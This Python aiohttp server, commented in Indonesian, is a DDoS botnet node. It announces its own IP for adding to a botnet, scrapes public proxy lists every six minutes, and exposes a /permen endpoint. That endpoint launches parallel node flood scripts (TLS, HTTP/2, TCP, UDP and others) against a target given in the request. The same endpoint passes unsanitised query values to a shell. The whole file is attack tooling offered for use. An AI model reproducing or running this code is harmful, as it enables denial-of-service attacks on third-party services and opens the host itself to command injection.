import asyncio
import aiohttp
from aiohttp import web
import subprocess
import os
import sys
import signal
import time
import json
from typing import Dict, Set
import requests
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = web.Application()
port = int(os.getenv('PORT') or os.getenv('SERVER_PORT') or 2906)

# Menyimpan daftar PID proses yang berjalan
active_processes: Dict[int, subprocess.Popen] = {}

async def fetch_data():
    """Mengambil data dari API eksternal untuk mendapatkan alamat IP"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api.ipify.org?format=json', timeout=120) as response:
                data = await response.json()
                
                ip_address = data.get('ip', 'Unknown IP')
                logger.info(f"Copy This Add To Botnet -> http://{ip_address}:{port}")
                
                return data
    except asyncio.TimeoutError:
        logger.error("Error: Permintaan ke server terlalu lama.")
    except aiohttp.ClientError as e:
        logger.error(f"Error: Tidak dapat terhubung ke server: {e}")
    except Exception as e:
        logger.error(f"Error fetching data: {e}")
    
    return None

async def scrape_proxy():
    """Mengambil daftar proxy dari beberapa sumber dan menyimpannya ke file"""
    sources = [
        # === HTTP / HTTPS (AKTIF) ===
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
        "https://cdn.jsdelivr.net/gh/sunny9577/proxy-scraper/proxies.txt",
        
        # === SOCKS4 ===
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
        
        # === SOCKS5 ===
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt"
    ]
    
    proxies: Set[str] = set()
    
    async with aiohttp.ClientSession() as session:
        for url in sources:
            try:
                async with session.get(url, timeout=30) as response:
                    content = await response.text()
                    new_proxies = content.strip().split("\n")
                    for proxy in new_proxies:
                        if proxy.strip():
                            proxies.add(proxy.strip())
            except Exception as e:
                logger.error(f"Error fetching from {url}: {e}")
    
    if proxies:
        with open("proxy.txt", "w") as f:
            f.write("\n".join(proxies))
        logger.info(f"Total proxies saved: {len(proxies)}")
    else:
        logger.info("No proxies fetched.")

async def scrape_proxy_loop():
    """Loop untuk scrape proxy setiap 6 menit"""
    while True:
        await scrape_proxy()
        await asyncio.sleep(360)  # 6 menit dalam detik

def generate_command(target, port, time_val, methods):
    """Menghasilkan perintah berdasarkan metode serangan yang dipilih"""
    current_dir = os.getcwd()
    metode = f"{current_dir}/api/{methods}"
    
    commands = {
        'tls': f"node {metode} {target} {time_val} 32 5",
        'http': f"node {metode} {target} {time_val}",
        'bomb': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'mix': f"node {metode} {target} {time_val} 32 5",
        'bypass': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'https': f"node {metode} {target} {time_val} 32 2 proxy.txt flood",
        'storm': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'flood': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'h2-volt': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'h2-flash': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'h2-code': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'h2-blast': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'h2-kill': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'h2-glo': f"node {metode} {target} {time_val} 32 2 proxy.txt",
        'h2-god': f"node {metode} {target} {time_val} 16 2 proxy.txt",
        'h2-fast': f"node {metode} GET {target} {time_val} 2 32 proxy.txt --query 1 --delay 1 --bfm true --ratelimit true --randrate true --cdn true --full --legit --precheck true",
        'tcp': f"node {metode} {target} {port} {time_val}",
        'udp': f"node {metode} {target} {port} {time_val}"
    }
    
    return commands.get(methods)

def terminate_processes(pids):
    """Menghentikan semua proses berdasarkan daftar PID setelah waktu yang ditentukan"""
    for pid in pids:
        try:
            if pid in active_processes:
                proc = active_processes[pid]
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                del active_processes[pid]
                logger.info(f"Process {pid} (node) terminated successfully.")
            else:
                # Coba kill langsung jika tidak di active_processes
                os.kill(pid, signal.SIGTERM)
                logger.info(f"Process {pid} killed.")
        except ProcessLookupError:
            logger.info(f"Process {pid} sudah berhenti.")
        except Exception as e:
            logger.error(f"Gagal menghentikan proses {pid}: {e}")

async def permen_handler(request):
    """Endpoint untuk memulai proses node berdasarkan permintaan pengguna"""
    target = request.query.get('target')
    port_val = request.query.get('port')
    time_val = request.query.get('time')
    methods = request.query.get('methods')
    concurrency = request.query.get('concurrency')
    
    if not target or not time_val or not methods:
        return web.json_response(
            {"detail": "Semua parameter (target, time, methods) harus disediakan"},
            status=400
        )
    
    concurrency_num = int(concurrency) if concurrency else 2  # Default 2 jika tidak disediakan
    
    response_data = {
        "status": "Serangan Dimulai....",
        "target": target,
        "port": port_val,
        "time": time_val,
        "methods": methods,
        "concurrency": concurrency_num
    }
    
    command = generate_command(target, port_val, time_val, methods)
    
    if command:
        logger.info(f"Received request: {methods} with concurrency {concurrency_num}")
        logger.info(f"Executing command: {command}")
        
        pids = []
        
        # Jalankan beberapa instance secara paralel
        for i in range(concurrency_num):
            try:
                # Gunakan shell=True untuk mendukung command kompleks
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                pid = proc.pid
                active_processes[pid] = proc
                pids.append(pid)
                logger.info(f"Process started with PID {pid} (instance {i + 1})")
            except Exception as e:
                logger.error(f"Failed to start process: {e}")
        
        # Jadwalkan penghentian semua proses setelah `time_val` detik
        async def terminate_later():
            await asyncio.sleep(int(time_val))
            terminate_processes(pids)
        
        asyncio.create_task(terminate_later())
        
    else:
        logger.info('Metode tidak valid diberikan.')
    
    return web.json_response(response_data)

async def start_background_tasks(app):
    """Start background tasks"""
    app['scrape_task'] = asyncio.create_task(scrape_proxy_loop())
    # Initial fetch
    await scrape_proxy()

async def cleanup_background_tasks(app):
    """Cleanup background tasks"""
    app['scrape_task'].cancel()
    await app['scrape_task']

async def on_startup(app):
    """Startup handler"""
    await fetch_data()
    await start_background_tasks(app)

async def on_shutdown(app):
    """Shutdown handler"""
    await cleanup_background_tasks(app)
    # Terminate all active processes
    pids = list(active_processes.keys())
    terminate_processes(pids)

# Setup routes
app.router.add_get('/permen', permen_handler)

if __name__ == '__main__':
    # Setup signal handlers
    app.on_startup.append(on_startup)
    app.on_shutdown.append(on_shutdown)
    
    # Run the server
    web.run_app(app, host='0.0.0.0', port=port)